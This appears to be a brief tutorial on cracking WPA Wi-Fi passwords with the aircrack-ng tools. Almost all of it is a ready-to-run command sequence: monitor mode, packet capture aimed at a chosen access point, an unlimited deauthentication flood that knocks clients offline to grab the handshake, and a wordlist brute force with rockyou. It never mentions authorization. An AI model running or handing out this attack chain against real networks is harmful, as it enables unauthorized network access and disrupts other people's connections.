Since WPA is a strong protocol we can't simply hack it, but we can bruteforce it!

### Useful Commands

First we want to turn on the interface in monitor mode, given that the monitor mode is supported by your card, but we have to kill the processes that interfere with the process of turning the interface into monitor mode.

```bash
# Kill the processes that interfere with starting wlan0 in monitor mode
sudo ifconfig wlan0 down
sudo airmon-ng check kill
# Now put the interface in monitor mode, put the interface up and restart network manager and 
sudo airmon-ng start wlan0
sudo service NetworkManager restart
sudo ifconfig wlan0 up
```

To check if the monitor mode is on and working, we can use the following command:

```bash
sudo iwconfig
```

Now we might need to unplug the USB device then plug it back, then use the following command:

```bash
sudo ifconfig wlan0 up
```

Then we run the following command to start capturing packets:

```bash
sudo airodump-ng wlan0
# To only display the access point that we want, we can use the following command:
sudo airodump-ng wlan0 -d <BSSID>
```

Now we can use the following command to write the captures to a file:

```bash
sudo airodump-ng -w <name of file> -c <channel> --bssid <BSSID> wlan0
```

Next ,we will disconnect a device from a network using deauth packet so we can capture a handshake, and to do so we will use the following command:

```bash
sudo aireplay-ng --deauth 0 -a <BSSID> wlan0
```

Finally we will start the brute forcing by using the following command:

```bash
aircrack-ng <.cap file> -w /usr/share/wordlists/rockyou.txt
```

Note: if we want to go back into managed mode, we can use the following command:

```bash
sudo airmon-ng stop wlan0
```